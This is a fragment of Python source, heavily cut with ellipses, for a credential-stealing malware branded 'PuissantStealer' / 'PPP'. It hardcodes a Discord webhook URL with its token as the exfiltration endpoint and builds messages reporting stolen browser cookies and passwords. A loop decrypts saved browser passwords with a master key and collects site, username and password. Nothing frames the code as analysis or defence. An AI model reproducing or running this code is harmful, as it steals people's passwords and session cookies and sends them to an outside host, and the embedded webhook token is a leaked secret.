...
hook = "https://discordapp.com/api/webhooks/1036868402154852432/_VCeL6_SC-I0MWH3mZSeQl34Kzkv_XQUq3sXOlucCbMDc4JwbIY57MIFtuOb_pOLM-Sb"
DETECTED = False
    ...
    try:
        ...
        data = {
            ...
            "embeds": [
                ...
                "footer": {
                    "text": "@PuissantStealer",
                    "icon_url": "https://cdn.discordapp.com/attachments/1031884430731644998/1035795542447509585/LGBT_flag_square.svg.png"
                    },
                "thumbnail": {
                    "url": f"{pfp}"
                    }
            ...
            "avatar_url": "https://cdn.discordapp.com/attachments/1031884430731644998/1035795542447509585/LGBT_flag_square.svg.png",
            "username": "Ez",
            "attachments": []
            }
    ...
    try:
        if name == "wpcook":
            ...
            data = {
                ...
                "embeds": [
                    {
                        "title": "PPP | Cookies Stealer",
                        "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [PPPCookies.txt]({link})",
                        "color": 14406413,
                        "footer": {
                            "text": "@Ez",
                            "icon_url": "https://cdn.discordapp.com/attachments/1031884430731644998/1035795542447509585/LGBT_flag_square.svg.png"
    ...
    try:
        if name == "wppassw":
            ...
            data = {
                ...
                "embeds": [
                    {
                        "title": "PPP | Password Stealer",
                        "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [PPPPassword.txt]({link})",
                        "color": 14406413,
                        "footer": {
                            "text": "@Ez",
                            "icon_url": "https://cdn.discordapp.com/attachments/1031884430731644998/1035795542447509585/LGBT_flag_square.svg.png"
    ...
    try:
        ...
        for row in data: 
            if row[0] != '':
                ...
                Passw.append(f"UR1: {row[0]} | Username: {row[1]} | Password: {DecryptValue(row[2], master_key)}")
                PasswCount += 1
